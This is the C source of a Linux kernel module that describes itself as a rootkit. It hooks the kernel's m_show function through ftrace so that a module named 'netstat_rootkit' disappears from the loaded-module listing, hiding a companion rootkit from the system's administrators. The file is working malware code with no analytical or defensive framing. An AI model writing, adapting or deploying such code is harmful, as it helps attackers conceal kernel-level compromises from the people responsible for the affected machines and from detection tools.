#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>


#include "ftrace_helper2.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("ROYCO");
MODULE_DESCRIPTION("a kernel module rootkit");
MODULE_VERSION("1");


static asmlinkage int new_m_show(struct seq_file *m, void *p);
static asmlinkage int (*old_m_show)(struct seq_file *m, void *p);


static struct ftrace_hook hooks[] = {
 	HOOK("m_show", new_m_show, &old_m_show),
 };


static int __init rootkit_enter(void) {

	int err;

	printk(KERN_INFO "module hiding rootkit: is operating\n");
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;


	 return 0;
}

static void __exit rootkit_exit(void) {


	//remove ftrace hooks
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "module hiding rootkit: stopped\n");
}




static asmlinkage int new_m_show(struct seq_file *m, void *p)
{
	struct module *mod = list_entry(p, struct module, list);
	if (strcmp(mod->name, "netstat_rootkit") == 0)
	{
		printk(KERN_INFO "not so fast amigo\n");
		seq_puts(m,"");
		return 0;	
	}
	return old_m_show(m, p);
}


module_init(rootkit_enter);
module_exit(rootkit_exit);

